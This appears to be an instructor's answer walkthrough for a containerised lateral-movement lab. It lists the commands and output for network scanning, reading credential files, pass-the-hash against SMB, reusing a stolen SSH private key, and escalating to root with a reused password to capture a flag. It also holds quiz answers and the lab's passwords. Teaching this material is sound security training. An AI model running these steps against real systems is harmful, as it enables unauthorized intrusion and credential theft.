# Week 9 Worksheet Walkthrough — INSTRUCTOR ONLY

> Verified against live containers (full chain run end-to-end on
> `docker compose up -d` with no manual fixes). Do not distribute to
> students before the end of the session.

---

## Setup

```bash
cd labs/week9 && docker compose up -d
# Wait ~30-45s for provisioning, then:
docker exec -it week9-attacker bash
```

**Verified result:** all four containers reach a steady state; `week9-workstation`
generates an SSH keypair on first boot and `week9-ubuntu-desktop` blocks on
a wait-loop until that key's public half lands in the shared
`week9-key-exchange` volume, then installs it into `deskuser`'s
`authorized_keys`.

---

## Part 1: Enumerate the Network

```bash
nmap -sn 10.10.9.0/24
```
**Verified result:** reports `10.10.9.10`, `10.10.9.11`, `10.10.9.12` up
(plus the attacker itself and the Docker gateway).

```bash
nmap -sV -p 22 10.10.9.10
```
**Verified result:** `22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.17`.

---

## Part 2: Credential Dumping on the Foothold

```bash
ssh netadmin@10.10.9.10   # password: Sp1ngR3set!
cat /etc/shadow
```
**Verified result:** `cat: /etc/shadow: Permission denied` — `netadmin` is
not root and not in the `shadow` group, so the default Ubuntu file
permissions (`-rw-r-----root:shadow`) block it. This is a **negative
finding** worth calling out explicitly to students: the shadow file itself
is *not* misconfigured here, the weak-permission file elsewhere is.

```bash
find / -type f -perm -o+w 2>/dev/null
```
**Verified result:**
```
/opt/maintenance/backup-notes.txt
```

```bash
cat /opt/maintenance/backup-notes.txt
```
**Verified result:**
```
# nightly SMB backup sync (legacy cron job, do not edit)
# local cache of the service account hash for break-glass recovery
# format: username:uid:LM-hash:NT-hash:::
svcacct:1000:aad3b435b51404eeaad3b435b51404ee:D96652F55443534D10FCA67C4BAAD485:::
```
The NT hash students need for Part 3 is `D96652F55443534D10FCA67C4BAAD485`.
(This hash was computed independently with a from-scratch MD4
implementation and cross-checked against Samba's own `pdbedit -L -w`
output for the same password before being baked into the compose file —
it is not an arbitrary string.)

```bash
find / -name id_rsa 2>/dev/null
```
**Verified result:** `/opt/maintenance/.ssh_backup/id_rsa` — a
freshly-generated (at container start, per-run, never committed to the
repo) 2048-bit RSA key whose **public** half was pushed to
`week9-ubuntu-desktop`'s `authorized_keys` for `deskuser` via the shared
`week9-key-exchange` volume. The private half only ever lives on
`week9-workstation`'s own filesystem with world-readable (644) permissions
— that's the vulnerability.

---

## Part 3: Pass-the-Hash Against the File Server

```bash
smbclient -L //10.10.9.12/ -N
```
**Verified result:** anonymous login succeeds; lists `public`, `secure`,
`IPC$`.

```bash
smbclient //10.10.9.12/public -N -c 'ls; get notice.txt -'
```
**Verified result:** notice reads *"IT Notice: file shares are being
migrated this quarter. Handover documentation for the migration is on the
secure share."* — a breadcrumb, not a credential.

```bash
smbclient //10.10.9.12/secure -N -c 'ls'
```
**Verified result:** `tree connect failed: NT_STATUS_ACCESS_DENIED` — the
anonymous session can authenticate to the server (`IPC$`/share listing
works) but has no permission on `secure`, which requires `svcacct`.

```bash
impacket-smbclient -hashes :D96652F55443534D10FCA67C4BAAD485 svcacct@10.10.9.12
```
```
shares
use secure
ls
cat handover-notes.txt
```
**Verified result:** authenticates successfully with **only the NT hash —
the plaintext password (`N3tw0rkSecure!24`) is never used or given to
students anywhere**. Inside `secure`:
```
Handover Notes (confidential)
Desktop migration access path: deskuser@10.10.9.11, SSH key only
(password auth is disabled there). Backup key cached on workstation.
```

**Sanity check (do this once before class, not with students):** re-run
the same command with a wrong hash
(`-hashes :00000000000000000000000000000000`) and confirm it fails with
`STATUS_LOGON_FAILURE` — this proves the success above is real
authentication, not a misconfigured "allow everyone" share.

---

## Part 4: Exploiting a Trust Relationship (SSH Key Reuse)

```bash
ssh deskuser@10.10.9.11
```
**Verified result:** `Permission denied (publickey)` for *any* password —
`PasswordAuthentication no` is set in `sshd_config` on this host
specifically so students can't brute-force or guess their way in. The only
route in is the key.

```bash
# copy the key found in Part 2 off workstation first, e.g.:
ssh netadmin@10.10.9.10 'cat /opt/maintenance/.ssh_backup/id_rsa' > ~/stolen_id_rsa
chmod 600 ~/stolen_id_rsa
ssh -i ~/stolen_id_rsa deskuser@10.10.9.11
whoami
```
**Verified result:** logs in as `deskuser` with no password at all —
confirmed by direct test (`whoami` → `deskuser`).

---

## Part 5: Credential Hunting and Privilege Escalation

```bash
cat /etc/app/backup.conf
```
**Verified result:**
```
service=db-backup-agent
backup_user=svc-backup
root_password=Th1sPasswordIsReused99
```

```bash
su root
# password: Th1sPasswordIsReused99
cat /root/root.txt
```
**Verified result:** `su` succeeds, `/root/root.txt` reads
`flag{w9_lateral_movement_root}`.

**Full chain, verified in one sitting with no manual intervention between
steps:** nmap → SSH foothold → `/etc/shadow` denied → weak-permission file
found → NT hash extracted → Pass-the-Hash into `secure` SMB share →
SSH private key found and reused → key-based login to a second host
(password login confirmed blocked) → config file credential hunt →
password-reuse escalation to root → flag retrieved.

---

## Quick Knowledge Check — Answers

1. **B** — reusing a hash instead of needing the plaintext password.
2. **B** — `netadmin` isn't root and isn't in the `shadow` group.
3. **B** — `PasswordAuthentication` is disabled on `week9-ubuntu-desktop`; only the key works.
4. **B** — credentials reused across services turn one leak into many compromises.
5. **False** — `psexec.py`/`wmiexec.py` depend on Windows-only RPC services (`SVCCTL` service creation, DCOM/WMI) that Samba does not implement; they do not work the same way against a Linux SMB server even though both speak SMB.

---

## Common Issues

- **`impacket-smbclient: command not found` on the attacker:** the
  attacker's startup command installs `impacket-scripts` on boot (needed
  for `impacket-smbclient`/`impacket-psexec` — `ethical-base` only ships
  `python3-impacket`, which provides the library and a different subset of
  console scripts such as `impacket-secretsdump`). If a student execs in
  before that finishes, give it a few more seconds or re-run
  `sudo apt-get install -y impacket-scripts`.
- **`week9-ubuntu-desktop` seems to hang on startup:** this is normal —
  it's in the `until [ -s .../deskuser_id_rsa.pub ]; do sleep 2; done`
  wait-loop until `week9-workstation` finishes generating its keypair and
  publishing the public half. Both containers reach steady state within
  about 30–45 seconds of `docker compose up -d`.
- **A student reuses the lab across runs and the SSH key "changes":** by
  design — `week9-workstation` only generates a new keypair if
  `/opt/maintenance/.ssh_backup/id_rsa` doesn't already exist, but a fresh
  `docker compose down` (which removes containers, not just stops them)
  followed by `up` starts clean and will generate a new key, which is
  fine; the worksheet never has students hardcode a specific key value.
